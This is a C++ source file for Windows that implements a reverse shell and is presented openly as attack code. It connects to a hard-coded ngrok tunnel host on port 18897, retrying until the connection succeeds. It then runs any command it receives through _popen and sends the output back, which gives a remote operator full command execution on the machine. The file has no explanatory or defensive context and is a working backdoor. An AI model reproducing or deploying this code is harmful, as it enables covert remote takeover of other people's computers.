#include <bits/stdc++.h>
#include <windows.h>
#define ll long long
#define MX 100005
#define bzero(p, size) (void)memset((p), 0, (size))
using namespace std;

int sock;

class Hack {
public:
    // Reserved for future features
};

class Shell_Execution : public Hack {
public:
    void Shell() {
        char buffer[MX];
        char container[1024]; // Smaller buffer for command output

        while (true) {
            bzero(buffer, sizeof(buffer));
            int bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);
            if (bytes_received <= 0) break;

            buffer[bytes_received] = '\0'; // Null-terminate safely

            if (strncmp("q", buffer, 1) == 0) {
                closesocket(sock);
                exit(0);
            } else {
                FILE *fp = _popen(buffer, "r");
                if (!fp) {
                    string error_msg = "Failed to execute command.\n";
                    send(sock, error_msg.c_str(), error_msg.size(), 0);
                    continue;
                }

                string total_response;
                while (fgets(container, sizeof(container), fp) != NULL) {
                    total_response += container;
                }
                fclose(fp);

                // Send only the actual output
                send(sock, total_response.c_str(), total_response.size(), 0);
            }
        }
    }
};

int main() {
    WSADATA wsaData;
    struct sockaddr_in x;
    ll port = 18897;
    const char *ip = "0.tcp.in.ngrok.io";

    WSAStartup(MAKEWORD(2, 0), &wsaData);
    sock = socket(AF_INET, SOCK_STREAM, 0);
    bzero(&x, sizeof(x));

    x.sin_family = AF_INET;
    x.sin_port = htons(port);

    struct hostent *host = gethostbyname(ip);
    x.sin_addr = *((struct in_addr *)host->h_addr);

    while (connect(sock, (struct sockaddr *)&x, sizeof(x)) != 0) {
        Sleep(10);
    }

    Shell_Execution se;
    se.Shell();

    return 0;
}

